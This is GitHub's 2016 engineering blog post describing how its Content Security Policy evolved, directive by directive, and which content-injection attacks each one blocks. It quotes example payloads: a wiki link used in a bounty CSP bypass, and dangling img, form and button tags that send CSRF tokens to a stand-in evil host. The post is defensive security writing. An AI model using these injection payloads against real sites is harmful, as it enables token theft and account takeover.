Title: GitHub's CSP journey

URL Source: https://github.blog/engineering/platform-security/githubs-csp-journey/

Published Time: 2016-04-12T07:00:00+00:00

Markdown Content:
We shipped [subresource integrity](http://githubengineering.com/subresource-integrity/) a few months back to reduce the risk of a compromised CDN serving malicious JavaScript. That is a big win, but does not address related content injection issues that may exist on GitHub.com itself. We have been tackling this side of the problem over the past few years and thought it would be fun, and hopefully useful, to share what we have been up to.

Just to get everyone on the same page, when talking about “content injection” we are talking about:

*   Cross Site Scripting (XSS) – Yup, the most common web vulnerability of the past, present, and foreseeable future. Given its prevalence, many developers are familiar with XSS and the obvious security consequences of allowing injected JavaScript to execute on your site.
*   Scriptless attacks – This is a more nuanced issue and is frequently not considered since people are too busy fending off XSS. But, as has been documented by Michal Zalewski in [“Postcards from the post-XSS world”](http://lcamtuf.coredump.cx/postxss/), Mario Heiderich (et al) in [“Scriptless Attacks – Stealing the Pie Without Touching the Sill”](https://www.nds.rub.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf), and other related work, preventing XSS does not solve all of your content injection problems.

GitHub uses auto-escaping templates, code review, and static analysis to try to prevent these kinds of bugs from getting introduced in the first place, but history shows they are unavoidable. Any strategy that relies on preventing any and all content injection bugs is bound for failure and will leave your engineers, and security team, constantly fighting fires. We decided that the only practical approach is to pair prevention and detection with additional defenses that make content injection bugs much more difficult for attackers to exploit. As with most problems, there is no single magical fix, and therefore we have employed multiple techniques to help with mitigation. In this post we will focus on our ever evolving use of [Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy) (CSP), as it is our single most effective mitigation. We can’t wait to follow up on this blog to additionally review some of the “non-traditional” approaches we have taken to further mitigate content injection.

### Content Security Policy[](https://github.blog/engineering/platform-security/githubs-csp-journey/#content-security-policy)

[Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy) is an HTTP header that enables a site to use a declarative policy to set restrictions for web resources (JavaScript, CSS, form submissions, etc). CSP is incredibly useful for leveling up the security of your site and is particularly suited for mitigating content injection bugs. GitHub was an early adopter of CSP, having shipped our [initial implementation](https://github.com/blog/1477-content-security-policy) approximately three years ago. CSP was in its infancy then and our initial policy reflected this:

```
CONTENT-SECURITY-POLICY:
  default-src *;
  script-src 'self' assets-cdn.github.com jobs.github.com ssl.google-analytics.com secure.gaug.es;
  style-src 'self' assets-cdn.github.com 'unsafe-inline';
  object-src 'self' assets-cdn.github.com;
```

The policy was relatively simple, but substantially reduced the risk of XSS on GitHub.com. After the initial ship we knew there was quite a bit more we could do to tighten things up. During our initial ship we were forced to trust a number of domains to maintain backward compatibility. The above policy did nothing to help with HTML injection that could be used to exfiltrate sensitive information (demonstrated below). However, that was almost three years ago, and a lot has changed since then. We have refactored the vast majority of our third-party script dependencies and CSP itself has also added a number of new directives to further help mitigate content injection bugs and strengthen our policy.

Our current CSP policy looks like this:

```
CONTENT-SECURITY-POLICY:
  default-src 'none';
  base-uri 'self';
  block-all-mixed-content;
  child-src render.githubusercontent.com;
  connect-src 'self' uploads.github.com status.github.com api.github.com www.google-analytics.com wss://live.github.com;
  font-src assets-cdn.github.com;
  form-action 'self' github.com gist.github.com;
  frame-ancestors 'none';
  frame-src render.githubusercontent.com;
  img-src 'self' data: assets-cdn.github.com identicons.github.com www.google-analytics.com collector.githubapp.com *.gravatar.com *.wp.com *.githubusercontent.com;
  media-src 'none';
  object-src assets-cdn.github.com;
  plugin-types application/x-shockwave-flash;
  script-src assets-cdn.github.com;
  style-src 'unsafe-inline' assets-cdn.github.com
```

While some of the above directives don’t directly relate to content injection, many of them do. So, let’s take a walk through the more important CSP directives that GitHub uses. Along the way we will discuss what our current policy is, how that policy prevents specific attack scenarios, and share some [bounty submissions](https://bounty.github.com/) that helped us shape our current policy.

#### `script-src`[](https://github.blog/engineering/platform-security/githubs-csp-journey/#script-src)

Unlike our original policy, we now only source JavaScript from our CDN. As was noted at the beginning of this post, we use subresource integrity to reduce our risk of sourcing malicious externally sourced JavaScript. The net result is that we have a very high assurance that the only JavaScript we are sourcing is what is checked into Git and then uploaded to our CDN. Of particular note is our lack of `self` in our source list. While sourcing JavaScript from `self` seems relatively safe (and extremely common), it should be avoided when possible.

There are edge cases that any developer must concern themselves with when allowing `self` as a source for scripts. There may be a forgotten JSONP endpoint that [doesn’t sanitize the callback function name](https://github.com/rails/rails/pull/9075). Or, another endpoint that serves user-influenced content with a `content-type` that could be [sniffed by browsers](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1420) as JavaScript. GitHub has several such endpoints. For example, we return [commit diffs](https://github.com/github/fetch/commit/7eee89d15ee21e762a04b4c773fcc3d7d50a13f7.diff) as `text/plain`. By eliminating `self` from our policy, we don’t need to be concerned that a CSP supporting browser will ever use this as source of JavaScript. We also mitigate this by using the `X-Content-Type-Options: nosniff` header, but CSP provides extremely strong assurances, even if there were a bug that let an attacker control `content-type`.

#### `object-src`[](https://github.blog/engineering/platform-security/githubs-csp-journey/#object-src)

We previously allowed `self` for object and embed tags. The sole reason for this was a legacy reliance of sourcing [ZeroClipboard](https://github.com/zeroclipboard/zeroclipboard) from GitHub.com. We had since moved that asset to our CDN and the `self` source was no longer needed. However, this legacy directive wasn’t removed from our policy and, as with all things related to “legacy” and “security,” a bounty hunter found [a way to exploit it](https://bounty.github.com/researchers/adob.html#persistent-cross-site-scripting--with-csp-bypass--20140210). This was a super interesting Bug Bounty submission that left us scratching our heads for a few minutes. The attack leveraged a content injection bug as well as a browser bug in Chrome to bypass CSP and gain JavaScript execution. The attack worked like this:

First, an attacker creates a Wiki entry with the following content:

```

<a href="https://some_evil_site.com/xss/github/embed.php" class="choose_plan js-domain">domain</div>
```

One of the core features on GitHub is rendering user-supplied HTML (often via Markdown) in various locations (Issues, Pull Requests, Comments). All of these locations sanitize the resulting HTML to a safe subset to protect against arbitrary HTML injection. However, we had an oversight in our Wiki HTML sanitization filter that allowed setting an arbitrary `class` attribute. The combination of setting the class to  
`choose_plan` and `js-domain` triggered some automatic behavior in our JavaScript to fetch the `href` associated with the element and insert the response into the DOM. The resulting HTML was still subject to CSP and would not allow executing arbitrary JavaScript. It did however allow an attacker to insert arbitrary HTML into the DOM. The injected content in the proof of concept was the following:

```
https://github.com/test-user/test-repo/raw/master/script.png
```

The sourced URL corresponds to a “raw request” for a file in a user’s repository. A raw request for a non-binary file returns the file with a `content-type` of `text/plain`, and is displayed in the user’s browser. As was hinted at previously, user-controlled content in combination with content sniffing often leads to unexpected behavior. We were well aware that serving user-controlled content on a GitHub.com domain would increase the chances of script execution on that domain. For that very reason, we serve all responses to raw requests on their own domain. A request to `https://github.com/test-user/test-repo/raw/master/script.png` will result in a redirect to `https://raw.githubusercontent.com/test-user/test-repo/master/script.png`. And, `raw.githubusercontent.com` wasn’t on our `object-src` list. So, how was the proof of concept able to get Flash to load and execute?

After rereading the submission, doing a bit of researching, and brewing some extra coffee, we came across [this WebKit bug](https://bugs.webkit.org/show_bug.cgi?id=97030). Browsers are required to verify that all requests, including those resulting from redirects, are allowed by the CSP policy for the page. However, some browsers were only checking the domain from the first request against the source list in our CSP policy. Since we had `self` in our source list, the embed was allowed. Combining the Flash execution with the injected HTML (specifically the `allowscriptaccess=always` attribute) resulted in a full CSP bypass. The submission earned [@adob](https://bounty.github.com/researchers/adob.html) a gold star and further cemented his placement at the [top of the leaderboard](https://bounty.github.com/#leaderboard). We now restrict object embeds to our CDN, and hope to block all object embeds once more broad support for the [clipboard API](https://www.w3.org/TR/clipboard-apis/) is in place.

Note: The file that that was fetched in the above bounty submission was returned with a `content-type` of `image/png`. Unfortunately, Flash has a bad habit of desperately wanting to execute things and will gleefully execute if the response vaguely looks and quacks like a Flash file :rage 😡" src="https://github.githubassets.com/images/icons/emoji/unicode/1f621.png" alt="😡" width="20" height="20" loading="lazy"\>.

#### `img-src`[](https://github.blog/engineering/platform-security/githubs-csp-journey/#img-src)

Unlike the directives we have talked about so far, `img-src` doesn’t often come to mind when talking about security. By restricting where we source images, we limit one avenue of sensitive data exfiltration. For example, what if an attacker were able to inject an `img` tag like this?

```
<img src='http://some_evil_site.com/log_csrf?html=
```

A tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on the pages such as:

```
<form action="https://github.com/account/public_keys/19023812091023">
...
<input type="hidden" name="csrf_token" value="some_csrf_token_value">
</form>
```

The resulting image element will send a request to `http://some_evilsite.com/log_csrf?html=...some_csrf_token_value...`. An attacker can leverage this “dangling markup” attack to exfiltrate CSRF tokens to a site of their choosing. There are a number of types of dangling markup which could lead to the similar exfiltration of sensitive information, but CSP’s restrictions helps to reduce the tags and attributes that can be targeted.

#### `connect-src`[](https://github.blog/engineering/platform-security/githubs-csp-journey/#connect-src)

As was noted above, GitHub has JavaScript that performs DOM modification by automatically fetching a URL from tags with a specific CSS class. We never intended to insert content sourced from anywhere besides GitHub.com, but until we added support for the `connect-src` directive, nothing was restricting the origin of the rendered response. Our current policy dramatically reduces the attack surface by limiting JavaScript connections to a small set of domains. We have recently further locked down our `connect-src` policy by adding support for dynamic policy additions. Historically, it has been relatively tedious to make dynamic changes to our policy per endpoint (i.e. we didn’t do it). But, with some [recent development](https://github.com/twitter/secureheaders/pull/191) by [@oreoshake](https://github.com/oreoshake) to the [Secure Headers library](https://github.com/twitter/secureheaders), it is now much easier for us going forward. For example, connections to `api.braintreegateway.com` only occur on payment related pages. We can now enforce a unique exception to our policy, appending the third-party host only on pages that need to connect to the payment endpoint. Over time we hope to lock down other unique connection endpoints using dynamic CSP policies.

#### `form-action`[](https://github.blog/engineering/platform-security/githubs-csp-journey/#form-action)

By limiting where forms can be submitted we help mitigate the risk associated with injected `form` tags. Unlike the “dangling markup” attack described above for image tags, forms are even more nuanced. Imagine an attacker is able to inject the following into a page:

```
<form action="https://some_evil_site.com/log_csrf_tokens">
```

Sitting below the injection location is a form like:

```
<form action="https://github.com/account/public_keys/19023812091023">
...
<input type="hidden" name="csrf_token" value="afaffwerouafafaffasdsd">
</form>
```

Since the injected form has no closing `</form>` tag we have a situation where the original form is nested inside of the injected form. Nested forms are not allowed and browsers will prefer the topmost form tag. So, when a user submits the form they will export their CSRF token to an attacker, subsequently allowing an attacker to perform a CSRF attack against the user.

Similarly, there happens to be a relatively obscure feature of `button` elements:

```
<button type="submit" form="version-form" formaction="https://some_evil_site.com/log_csrf_tokens">Click Me</button>
```

By limiting `form-action` to a known set of domains we don’t have to think nearly as hard about all the possible ways form submissions might exfiltrate sensitive information. Support for `form-action` is probably one of the most effective recent additions to our policy, though adding it was not without challenges.

When we considered what might break in adding support for `form-action`, we thought it would roll out cleanly. There were no forms identified that we submitted to an off-site domain. But, as soon as we deployed the “preview policy” (visible only to employees) we found an edge case we hadn’t anticipated. When users authorize an OAuth application they visit a URL like `https://github.com/login/oauth/authorize?client_id=b6a3dd26bac171548204`. If the user has previously authorized the application they are immediately redirected to the OAuth application’s site. If they have not authorized the application they are presented a screen to grant access. This confirmation screen results in a form `POST` to GitHub.com that does a 302 redirect to the OAuth application’s site. In this case, the form submission is to GitHub.com, but the request results in a redirect to a third-party site. CSP considers the full request flow when enforcing `form-action`. Because the form submission results in navigation to a site that is not in our `form-action` source list, the redirect is denied.

Recall that we have relied (until recently) on a static policy enforced on every page on GitHub.com. There was no easy way for us to modify the policy dynamically based on the OAuth authorization submission. At first we thought this was a deal breaker and would require us to remove support for `form-action` until we had better support for a dynamic policy. Luckily, we found a work around by using a “meta refresh” redirect. We refactored our OAuth endpoint to redirect to the OAuth application’s site using a meta refresh tag (we have since optimized this to use a faster JS redirect that falls back to the meta refresh if necessary). By avoiding a 302 redirect, CSP only considers the initial form submission and not the subsequent redirect. We are effectively cheating by decoupling the form submission from the redirection. We would eventually like to add support for a dynamic source for our `form-action`, but the meta refresh and JavaScript redirection hack allowed us to move forward with our deployment of `form-action`. The benefits of this change overwhelmingly outweighed the downsides and we deployed the solution to production last May.

#### `child-src`/`frame-src`[](https://github.blog/engineering/platform-security/githubs-csp-journey/#child-src-frame-src)

Inline frames (iframes) are a strong security boundary. Each frame enforces same-origin restrictions just as if the framed content were opened in a unique window or tab. However, there are still some small security benefits in restricting which pages we allow to be framed. For example, consider an attacker injecting a frame on GitHub.com. The frame would load an arbitrary website which could subsequently request HTTP Authentication using an HTTP 401 response code. Browsers don’t handle nested contexts and browser dialogs very well. Security savvy users may instantly recognize that GitHub doesn’t use basic authentication or JavaScript `prompt` dialogs, but many users wouldn’t understand the nuance and may be socially engineered into providing their GitHub credentials. Firefox has support for some frame sandbox directives that try to prevent this behavior, such as `allow-modals`, but these directives only apply to explicitly sandboxed frames. There is no similar CSP directive that restricts what an arbitrary frame can do regarding modal dialogs. The only current mitigation is to limit the domains that can be framed.

Our current policy globally allows our render domain (used for rendering things such as [STL files](https://help.github.com/articles/3d-file-viewer/), [image diffs](https://help.github.com/articles/rendering-and-diffing-images/), and [PDFs](https://help.github.com/articles/rendering-pdf-documents/)). Not long ago we also allowed `self`. However, `self` was only used on a single page to preview GitHub Pages sites generated using our automatic generator. Using our recent support for dynamic policy additions, we now limit the `self` source to the GitHub Pages preview page. After some additional testing, we may be able to use a similar dynamic policy for rendering in the future.

#### `frame-ancestors`[](https://github.blog/engineering/platform-security/githubs-csp-journey/#frame-ancestors)

This directive effectively replaces the `X-FRAME-OPTIONS` header and mitigates clickjacking and other attacks related to framing GitHub.com. Since this directive does not yet have broad browser support, we currently set both the `frame-ancestors` directive and the `X-FRAME-OPTIONS` header in all responses. Our default policy prevents any framing of content on GitHub.com. Similar to our `frame-src`, we use a dynamic policy to allow `self` for previewing generated GitHub Pages sites. We also allow framing of an endpoint used to share Gists via iframes.

#### `base-uri`[](https://github.blog/engineering/platform-security/githubs-csp-journey/#base-uri)

Though not incredibly common, if an attacker can inject a `base` tag into the head of a page, they can change what domain all relative URLs use. By restricting this to `self`, we can ensure that an attacker cannot modify all relative URLs and force form submissions (including their CSRF tokens) to a malicious site.

#### `plugin-types`[](https://github.blog/engineering/platform-security/githubs-csp-journey/#plugin-types)

Many browser plugins have a less than stellar security record. By restricting plugins to those we actually use on GitHub.com, we reduce the potential impact of an injected `object` or `embed` tag. The `plugin-types` directive is related to the `object-src` directive. As was noted above, once more broad support for the [clipboard API](https://www.w3.org/TR/clipboard-apis/) is in place, we intend to block `object` and `embed` tags. At that point, we will be able to set our `object-src` source list to `none` and remove `application/x-shockwave-flash` from `plugin-types`.

### What’s next?[](https://github.blog/engineering/platform-security/githubs-csp-journey/#whats-next)

We are thrilled with the progress we have made with our CSP implementation and the security protections it provides to our users. Incremental progress has been key to getting our policy, and the underlying browser features, to the maturity it is today. We will continue to expand our use of dynamic CSP policies, as they let us work toward a “least privilege” policy for each endpoint on GitHub.com. Furthermore, we will keep our eyes on [w3c/webappsec](https://github.com/w3c/webappsec) for the next browser feature enabling us to lock things down even more.

No matter how restrictive our policy, we remain humble. We know there will always be a content injection attack vector that CSP does not prevent. We have started to implement mitigations for the gaps we know of, but, it is a work in progress as we look to current research and constant brainstorming to identify loopholes. We would love to write about our work mitigating some of these “post-CSP” edge cases. Once a few more pull requests are merged, we will be back to share some details. Until then, good luck on your own CSP journey.

Written by
----------

 ![Image 1: Patrick Toomey](https://avatars2.githubusercontent.com/u/103360?v=4&s=200)
